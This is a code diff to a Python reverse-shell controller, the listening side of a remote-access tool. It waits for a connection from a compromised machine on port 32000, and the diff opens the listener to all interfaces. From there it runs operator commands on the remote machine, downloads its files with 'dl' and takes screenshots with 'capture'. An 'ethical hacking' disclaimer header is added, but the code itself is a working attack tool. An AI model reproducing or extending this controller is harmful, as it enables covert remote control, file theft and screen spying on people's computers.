@@ -1,6 +1,13 @@
+# --- ETHICAL HACKING PROJECT DISCLAIMER ---
+# This code is for educational and ethical hacking purposes only.
+# The author is not responsible for any illegal use or damage caused by this software.
+# Use it only on systems you own or have explicit permission to test.
+# ------------------------------------------
+
 import socket
 
-HOST_IP = "127.0.0.1"
+# LocalHost : 127.0.0.1
+HOST_IP = ""
 HOST_PORT = 32000
 MAX_DATA_SIZE = 1024
 
@@ -40,20 +47,21 @@ s.listen()
 print(f"Listening for connection on {HOST_IP}, port {HOST_PORT}.......")
 connection_socket, client_address = s.accept()
 print(f"Connection established with {client_address}")
-s.close()
 
 dl_filename = None
 while True:
     client_machine_info = send_command_and_receive_all_data(connection_socket, "info")
     if not client_machine_info:
         break
-    command = input(f"{client_machine_info.decode()} >  ")
+    command = input(f"{client_address} {client_machine_info.decode()} >  ").strip(' ')
 
-    command_split = command.split(' ')
-    if len(command_split) == 2 and command_split[0] == "dl":
-        dl_filename = command_split[1]
-    if len(command_split) == 2 and command_split[0] == "capture":
-        dl_filename = command_split[1]+".png"
+    command_split = command.split(' ', 1)
+    if len(command_split) == 2:
+        command_split[1] = command_split[1].strip('"').strip("'")
+        if command_split[0] == "dl":
+            dl_filename = command_split[1]
+        elif command_split[0] == "capture":
+            dl_filename = command_split[1]+".png"
 
     data = send_command_and_receive_all_data(connection_socket, command)
     if not data:
@@ -66,11 +74,12 @@ while True:
             f = open(dl_filename, "wb")
             f.write(data)
             f.close()
-            print("File",dl_filename,"download")
+            print("File",dl_filename,"was successfully downloaded")
         dl_filename = None
     else:
         print(data.decode())
 
+s.close()
 connection_socket.close()
 
 """
